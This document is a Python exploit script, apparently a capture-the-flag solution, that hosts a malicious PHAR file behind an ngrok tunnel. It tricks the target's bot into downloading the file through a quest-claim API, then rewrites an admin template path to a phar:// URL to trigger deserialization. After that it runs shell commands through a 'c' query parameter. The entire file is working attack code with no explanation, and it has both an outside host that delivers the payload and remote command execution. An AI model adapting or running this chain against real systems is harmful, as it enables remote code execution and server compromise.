import subprocess
import requests
import time
import sys
import argparse
import os
import threading

from flask import Flask, send_file, Response

app = Flask(__name__)

PORT = 5000

TARGET_URL = ""
PHAR_FILE = "./poc.phar"
CMD = ""

NGROK_PROCESS = None
NGROK_PUBLIC_URL = None

PHAR_DOWNLOADED = False

@app.route(f'/phar')
def serve_phar():
    print('[+] Bot requested the PHAR file.')
    
    global PHAR_DOWNLOADED
    PHAR_DOWNLOADED= True

    return send_file(PHAR_FILE, mimetype='application/octet-stream')

@app.route('/')
def serve_index():
    print('[+] Bot accessed the landing page.')
    with open('index.html', 'r') as f:
        html_template =  f.read()

    phar_name = os.path.basename(PHAR_FILE)
    html_template = html_template.replace('__PHAR_NAME__', phar_name)

    return Response(html_template, mimetype='text/html')

def start_ngrok(port):
    global NGROK_PROCESS, NGROK_PUBLIC_URL
    NGROK_PROCESS = subprocess.Popen(['ngrok', 'http', str(port)], stdout=subprocess.DEVNULL)
    print("[*] Starting ngrok...")

    time.sleep(2)
    try:
        tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()['tunnels']
        NGROK_PUBLIC_URL = tunnels[0]['public_url']
        print(f"[*] Ngrok tunnel started at: {NGROK_PUBLIC_URL}")
    except Exception as e:
        print("[!] Failed to retrieve ngrok URL:", e)
        sys.exit(1)

def validate_args():
    global TARGET_URL, PHAR_FILE, CMD

    parser = argparse.ArgumentParser()
    parser.add_argument('--target', help='Url challenge', default="http://localhost:1337")
    parser.add_argument('--phar', default="./poc.phar", help='Phar Location')
    parser.add_argument('--cmd', default="cat /flag*txt", help='Command')

    args = parser.parse_args()
    PHAR_FILE = args.phar
    TARGET_URL = args.target
    CMD = args.cmd

def update_settings():
    print('[*] Sending request to update template_path (phar exploit injection).')

    phar_name = os.path.basename(PHAR_FILE)
    data = {
        "template_path":"phar:///var/www/Downloads/" + phar_name
    }
    response = requests.post(TARGET_URL + "/api/admin/appSettings", json=data)
    print(f'[+] Server responded: {response.status_code} - {response.text[:50]}')

def get_flag():
    print(f'[*] Sending command: {CMD}')

    query = {
        "c": CMD
    }
    response = requests.get(url=TARGET_URL, params=query)
    
    if response.status_code == 200 and 'Exploit' in response.text:
        print('[+] Exploit executed successfully. Server response:')
        print(response.text)
        return True
    else:
        print('[!] Exploit not triggered or failed.')
        return False

def delivery_exploit():
    request_to_download()
    update_settings()
    time.sleep(2)
    get_flag()

def request_to_download():
    while True:
        print('[*] Sending quest URL to bot to trigger PHAR download...')
        data = {
            "questId":"q1",
            "questUrl":NGROK_PUBLIC_URL,
            "companions":0
        }
        response = requests.post(TARGET_URL + "/api/claimQuest", json=data)
        print(f'[+] Response: {response.status_code} - {response.text[:50]}')

        time.sleep(15)
        if PHAR_DOWNLOADED:
            print('[+] PHAR file was downloaded by the bot.')
            break

def wait_to_execute(func, delay, *args, **kwargs):
    def wrapper():
        time.sleep(delay)
        func(*args, **kwargs)

    thread = threading.Thread(target=wrapper)
    thread.start()
    return thread

if __name__ == '__main__':
    validate_args()
    
    already_exploited = get_flag()
    if already_exploited:
        print('[!] Looks like the server is already exploited.')
        exit()

    try:
        start_ngrok(PORT)
        
        wait_to_execute(delivery_exploit, 10)
        print('[*] Flask server running. Waiting for the bot...')
        app.run(host='0.0.0.0', port=PORT)
    except Exception:
        print('[*] Shutting down ngrok...')
        if NGROK_PROCESS:
            NGROK_PROCESS.terminate()
